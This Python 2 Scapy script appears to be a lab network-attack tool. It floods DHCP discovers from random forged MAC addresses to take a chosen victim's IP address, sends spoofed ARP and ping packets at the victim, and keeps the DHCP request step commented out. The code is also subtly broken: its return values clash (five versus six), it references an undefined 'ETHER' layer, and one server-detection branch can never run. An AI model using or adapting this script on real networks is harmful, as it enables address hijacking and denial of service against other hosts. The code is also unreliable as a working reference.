from scapy.all import *
import random
from time import sleep

localiface = 'h1-eth0'
broadcastMac = 'ff:ff:ff:ff:ff:ff'
broadcastIp = '255.255.255.255'


def sendPingToVic(servMac, vicMac, vicIp, servIp):
    #For flow poisoning, ping the other server?
    
    pingEth = Ether(src = servMac, dst = vicMac)
    pingIp = IP(src = servIp, dst = vicIp)
    pingICMP = ICMP()

    fullPing = pingEth/pingIp/pingICMP
    stdPing = IP(dst=vicIp, src=servIp)/ICMP()
    pingRecv = ''
    count = 0
    while (not pingRecv) and count < 3:
        #CURRENTLY NOT SPOOFING
        pingRecv = srp1(fullPing, iface=localiface, timeout=2)
        count += 1
        print pingRecv
        print localiface

def sendArpToVic(servMac, vicMac, vicIp, servIp):
    arpEth = Ether(src = servMac, dst = broadcastMac)
    arp = ARP(op = 1, pdst = vicIp, psrc = servIp, hwsrc = servMac)
    fullArp = arpEth/arp
    srp1(fullArp, iface=localiface, timeout=2)

#Need to use local MAC so can get response? 

def arpDHCP(servIp):
    arpEth = Ether(dst = broadcastMac)
    
    arp = ARP(op = 1, pdst = servIp)
    fullArp = arpEth/arp
    recvPk = srp1(fullArp)
    return recvPk[Ether].src

def getDHCP(localMac, ipToTake, vicMac):

    newIp = ''
    count = 0
    fakeMac = ''
    fakeRaw = ''
    curXid = 0
    servIp = '11.22.33.44'
    servMac = '00:11:22:33:44:55'
    
    while newIp != ipToTake:
        count += 1
        fakeMac = ''
        for i in range(6):
            fakeMac += hex(random.randint(0,15))[-1]
            fakeMac += hex(random.randint(0,15))[-1]
            fakeMac += ":"
        fakeMac = fakeMac[:-1]

        fakeRaw = fakeMac.replace(':','').decode('hex')
        localRaw = localMac.replace(':','').decode('hex')
    
        ethPk = Ether(src=fakeMac, dst=broadcastMac)
        ipPk = IP(src='0.0.0.0', dst= broadcastIp)
        udpPk = UDP(dport=67,sport=68)
        curXid = random.randint(0,10000)
        bootPk = BOOTP(chaddr = fakeRaw, xid = curXid)
        dhcpPk = DHCP(options=[('message-type', 'discover'), 'end'])
        discovery = ethPk/ipPk/udpPk/bootPk/dhcpPk

        #Quick heuristic: assume first one wont be correct, so easy way to
        #get info
        #Current Trouble: Seem that l2_learning_switch is a per flow basis,
        #so may need to actually send ARPs instead of pings?
        #if servMac != '00:11:22:33:44:55':
        #    servMac = arpDHCP(servIp)
        #    sleep(12)
 #       sendPingToVic(servMac, vicMac, ipToTake, servIp)
        sendArpToVic('00:11:22:33:44:55', vicMac, ipToTake, servIp)
        recvPk = srp1(discovery,iface=localiface, timeout=5)
        if not recvPk:
            return (0,0,0,0,0)

        newIp = recvPk[BOOTP].yiaddr
        print newIp
        print fakeMac

        if servIp == '':
            servMac = recvPk[Ether].src
            for i in range(len(recvPk[DHCP].options)):
                if recvPk[DHCP].options[i][0] == "server_id":
                    servIp = recvPk[DHCP].options[i][1]
    
        
        #if count > 10:
 #       break
    print "Offered IP is: " 
    print recvPk[BOOTP].yiaddr
    print fakeMac
        
    servIp = recvPk[BOOTP].siaddr
    servMac = recvPk[ETHER].src
    for i in range(len(recvPk[DHCP].options)):
        if recvPk[DHCP].options[i][0] == "server_id":
            servIp = recvPk[DHCP].options[i][1]
    
    return (fakeMac, servIp, fakeRaw, curXid, newIp, servMac)

def main():
    conf.checkIPaddr = False
    localMac = sys.argv[1]
    ipToTake = sys.argv[2]
    vicMac = sys.argv[3]
    fakeMac, servIp, fakeRaw, curXid, newIp = getDHCP(localMac, ipToTake, vicMac)
    print newIp
    print fakeMac
    return

#Request for the DHCP addr; currently blocking when testing with udhcpd
#ethPk = Ether(src=fakeMac, dst = 'ff:ff:ff:ff:ff:ff')
#ppipPk = IP(src = "0.0.0.0", dst = "255.255.255.255")
#udpPk = UDP(dport=67, sport=68)
#bootPk = BOOTP(chaddr = fakeRaw, xid=curXid)
#requestPk = DHCP(options=[("message-type", "request"),
#                        ("server_id",servIp), ("requested_addr", newIp), "end"])
#
#fullReq = ethPk/ipPk/udpPk/bootPk/requestPk

#recvPk = srp1(fullReq, iface=localiface)

#print newIp
#print fakeMac


if __name__ == "__main__":
    main()

